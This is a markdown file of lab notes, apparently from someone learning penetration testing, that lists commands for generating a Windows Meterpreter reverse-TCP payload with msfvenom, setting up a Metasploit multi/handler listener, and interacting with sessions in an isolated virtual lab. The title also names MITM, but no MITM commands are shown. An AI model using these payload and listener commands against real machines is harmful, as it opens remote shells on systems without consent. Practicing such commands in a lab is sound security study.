# Reverse Shell and MITM Commands

This file contains commands practiced for reverse shell concepts, Metasploit handler setup, Meterpreter session interaction, and basic connectivity testing in a controlled virtual lab environment.

---

## Check Windows VM IP Address

Used on the Windows VM to identify its IP address.

```cmd
ipconfig
```

---

## Test Connectivity from Kali

Used to test connectivity between Kali Linux and the Windows VM.

```bash
ping <windows-vm-ip> -c5
```

---

## Generate Windows Reverse TCP Payload

Used to generate a Windows reverse TCP payload in a controlled lab environment.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=<port> --platform windows -f exe -o payload.exe
```

---

## Open Metasploit Console

Used to open the Metasploit Framework console.

```bash
msfconsole
```

---

## Use Multi Handler

Used to configure Metasploit to listen for an incoming reverse connection.

```bash
use multi/handler
```

---

## Set Payload

Used to set the same payload type used during payload generation.

```bash
set payload windows/meterpreter/reverse_tcp
```

---

## Set LHOST

Used to set the Kali Linux lab IP address.

```bash
set LHOST <kali-ip>
```

---

## Set LPORT

Used to set the listener port.

```bash
set LPORT <port>
```

---

## Start Listener

Used to start the listener as a background job.

```bash
exploit -j
```

---

## View Sessions

Used to view active Meterpreter sessions.

```bash
sessions
```

---

## Interact with a Session

Used to interact with a specific session.

```bash
sessions -i <session-id>
```

---

## Basic Meterpreter Commands Practiced

Used to view system information from the lab target machine.

```bash
sysinfo
```

Used to view network configuration from the lab target machine.

```bash
ipconfig
```

---

## Notes

- `<kali-ip>` should be replaced with the Kali Linux lab IP address.
- `<windows-vm-ip>` should be replaced with the Windows VM lab IP address.
- `<port>` should be replaced with the lab listener port.
- Sensitive details such as real IP addresses, MAC addresses, usernames, and passwords are replaced with placeholders before uploading publicly.
- These commands were practiced only in an isolated virtual lab environment.
